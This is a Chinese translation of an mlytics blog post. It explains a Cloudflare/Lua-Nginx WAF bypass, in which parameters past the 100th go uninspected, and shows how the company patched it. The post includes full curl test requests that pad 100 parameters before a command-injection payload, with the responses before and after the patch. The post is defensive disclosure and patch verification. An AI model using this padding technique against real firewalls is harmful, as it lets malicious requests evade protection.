# mlytics 如何修补 Cloudflare WAF bypass 漏洞(在我们这边)

> 原文：<https://dev.to/edowadohu/how-mlytics-patched-cloudflare-waf-bypass-vulnerability-on-our-end-4g0>

2018 年 10 月 25 日，来自 ODS(开放数据安全)的一位名叫[Daniel Faria](https://opendatasecurity.io/author/daniel-farina/)的研究人员发布了一篇[博文](https://opendatasecurity.io/cloudflare-vulnerability-allows-waf-be-disabled/)，分享了他对 Cloudflare 上 Nginx 案例中一个漏洞的发现，该漏洞可能会禁用 WAF，使公司容易受到网络攻击。甚至有一个[视频](https://www.youtube.com/watch?v=MlkUAfJETzI&feature=youtu.be)对这个问题提供了非常详细的解释和演示。

这一发现引起了我们的注意，因为我们也在使用 Nginx 开发自己的 WAF(参见文章:【mlytics 为什么以及如何构建自己的 Web 应用防火墙)。

## 到底发生了什么？

我们注意到 Nginx 中的 Lua 在访问一个请求的所有信息方面有一个限制，可以总结如下:

> “…默认情况下，最多解析 100 个请求参数(包括同名的请求参数)，额外的请求参数会被自动丢弃，以防止潜在的拒绝服务攻击”。

这意味着，在这种情况下，任何基于 Nginx 开发的 WAF 都将容易受到攻击，如果有人利用这一点作为漏洞，让一切都不被发现的话。如果包含威胁的参数在范围内不受支持，它将完全不可用。

## 那么我们为什么要修补任何东西呢？

在 mlytics，我们让用户自由选择使用什么 CDN 平台，同时通过我们专有的 WAF 保护他们，以保护和统一跨平台的安全政策。由于我们的一些用户通过 mlytics 的 [Multi CDN](https://mlytics.com/features/multi-cdn/) 启用了 Cloudflare，因此他们容易受到此问题的攻击。

我们没等多久就看到了 Cloudflare 修补漏洞。我们可以通过 mlytics 平台的补丁来拦截绕过 Cloudflare 的 Lua-Nginx 漏洞的恶意请求，以保护我们的用户。

## 管用！

我们做了一些前后测试，结果如下:

**打补丁前**
**测试场景:**带一个参数

> ”`curl -i ‘127.0.0.1/?txtSearch=<%21–%23cmd’ -H “Host: demo.1testfire.net”
> **HTTP/1.1 403 Forbidden**
> Server: nginx
> Date: Thu, 13 Dec 2018 07:08:05 GMT
> Content-Type: text/html
> Transfer-Encoding: chunked
> Connection: keep-alive
> Cache-Control: no-cache
> <!DOCTYPE html><html lang=”en”><head><meta charset=”UTF-8″>Error Page<link rel=”stylesheet” type=”text/css” href=”__assets/css/style.css”><link href=”https://fonts.googleapis.com/css?family=Raleway” rel=”stylesheet”></head><body><div class=”wrapper”><h1>ACCESS DENIED<span>Your request to access demo.1testfire.net was denied</span></h1><p class=”error_info”><span>Incident ID </span>31c75a46e100079d1449f5e4db85d6de</p><p class=”error_info”><span>Your IP </span>127.0.0.1</p><img src=”__assets/img/process_img.png”><div class=”next_Step”><p><span>What happened ?</span>The website you are trying to access is protected against cyber attacks. Your recent action or behavior was flagged as suspicious. Further access to the web server has been denied.</p> <p><span>What can I do ?</span>Please try again in a few minutes. Or, you can directly contact the site owner within Event ID indicated and a description of what you were doing before you were denied access.</p></div><span clas=”copyright”>Powered by mlytics.com</span></div></body></html>“`

**测试场景:**用 a0-a9，10*10，共 100 个参数，然后将第 101 个参数添加到命令注入净荷中

> ”`curl -i ‘127.0.0.1/?a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&<%21–%23cmd’ -H “Host: demo.1testfire.net”
> **HTTP/1.1 200 OK**
> Server: nginx
> Date: Thu, 13 Dec 2018 07:20:29 GMT
> Content-Type: text/html; charset=utf-8
> Transfer-Encoding: chunked
> Connection: keep-alive
> Cache-Control: no-cache
> Pragma: no-cache
> Expires: -1
> X-AspNet-Version: 2.0.50727
> Set-Cookie: ASP.NET_SessionId=2vb4y5453apg1cvpakfjigip; path=/; HttpOnly
> Set-Cookie: amSessionId=6207394219; path=/
> X-Powered-By: ASP.NET
> <!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”>
> <html xmlns=”http://www.w3.org/1999/xhtml” xml:lang=”en” >
> <head id=”_ctl0__ctl0_head”>……………….“`

正如您在我们的补丁之前所看到的，一个 100 个参数以内的请求很容易被 Cloudflare WAF 阻止。但一旦它超过 100 并达到第 101 个参数，Cloudflare WAF 就会变得不活动，并让它通过。

**补丁后**
**测试场景:**带一个参数

> ”`curl -i ‘127.0.0.1/?txtSearch=<%21–%23cmd’ -H “Host: demo.1testfire.net”
> **HTTP/1.1 403 Forbidden**
> Server: nginx
> Date: Thu, 13 Dec 2018 07:08:05 GMT
> Content-Type: text/html
> Transfer-Encoding: chunked
> Connection: keep-alive
> Cache-Control: no-cache
> <!DOCTYPE html><html lang=”en”><head><meta charset=”UTF-8″>Error Page<link rel=”stylesheet” type=”text/css” href=”__assets/css/style.css”><link href=”https://fonts.googleapis.com/css?family=Raleway” rel=”stylesheet”></head><body><div class=”wrapper”><h1>ACCESS DENIED<span>Your request to access demo.1testfire.net was denied</span></h1><p class=”error_info”><span>Incident ID </span>31c75a46e100079d1449f5e4db85d6de</p><p class=”error_info”><span>Your IP </span>127.0.0.1</p><img src=”__assets/img/process_img.png”><div class=”next_Step”><p><span>What happened ?</span>The website you are trying to access is protected against cyber attacks. Your recent action or behavior was flagged as suspicious. Further access to the web server has been denied.</p> <p><span>What can I do ?</span>Please try again in a few minutes. Or, you can directly contact the site owner within Event ID indicated and a description of what you were doing before you were denied access.</p></div><span class=”copyright”>Powered by mlytics.com</span></div></body></html>“`

**测试场景:**用 a0-a9，10*10，共 100 个参数，然后将第 101 个参数添加到命令注入净荷中

> ”`curl -i ‘127.0.0.1/?a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a2=2&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a3=3&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a4=4&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a5=5&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a6=6&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a7=7&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&<%21–%23cmd’ -H “Host: demo.1testfire.net”
> HTTP/1.1 403 Forbidden
> Server: nginx
> Date: Thu, 13 Dec 2018 07:18:51 GMT
> Content-Type: text/html
> Transfer-Encoding: chunked
> Connection: keep-alive
> Cache-Control: no-cache
> <!DOCTYPE html><html lang=”en”><head><meta charset=”UTF-8″>Error Page<link rel=”stylesheet” type=”text/css” href=”__assets/css/style.css”><link href=”https://fonts.googleapis.com/css?family=Raleway” rel=”stylesheet”></head><body><div class=”wrapper”><h1>ACCESS DENIED<span>Your request to access demo.1testfire.net was denied</span></h1><p class=”error_info”><span>Incident ID </span>-</p><p class=”error_info”><span>Your IP </span></p><img src=”__assets/img/process_img.png”><div class=”next_Step”><p><span>What happened ?</span>The website you are trying to access is protected against cyber attacks. Your recent action or behavior was flagged as suspicious. Further access to the web server has been denied.</p> <p><span>What can I do ?</span>Please try again in a few minutes. Or, you can directly contact the site owner within Event ID indicated and a description of what you were doing before you were denied access.</p></div><span class=”copyright”>Powered by mlytics.com</span></div></body></html>“`

有了 mlytics 对平台的补丁，同样的请求被我们的平台拒绝了，尽管在 Cloudflare 端没有任何改变。